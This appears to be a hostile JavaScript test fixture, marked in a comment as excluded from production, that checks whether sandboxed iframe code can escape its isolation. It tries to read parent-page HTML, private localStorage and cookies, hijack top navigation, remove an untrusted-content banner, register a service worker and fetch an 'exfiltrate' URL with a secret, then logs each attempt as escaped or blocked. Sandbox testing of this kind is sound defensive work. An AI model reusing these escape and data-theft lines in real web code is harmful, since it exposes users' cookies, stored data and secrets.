// Deliberately hostile test fixture, excluded from production.
document.querySelector('#attack').onclick = async () => {
  const results = {};
  for (const [name, action] of Object.entries({
    parent: () => parent.document.body.innerHTML,
    storage: () => top.localStorage.getItem('shelf-private'),
    cookies: () => top.document.cookie,
    top: () => { top.location.href = 'https://api.github.com/escape'; },
    banner: () => top.document.querySelector('[data-untrusted-banner]').remove(),
    popup: () => { if (!open('https://api.github.com/popup')) throw Error('blocked'); },
    worker: () => navigator.serviceWorker.register('/evil.js'),
    fetch: () => fetch('https://api.github.com/exfiltrate?data=repository-secret'),
  })) {
    try { await action(); results[name] = 'ESCAPED'; } catch { results[name] = 'blocked'; }
  }
  document.querySelector('#results').textContent = JSON.stringify(results);
};
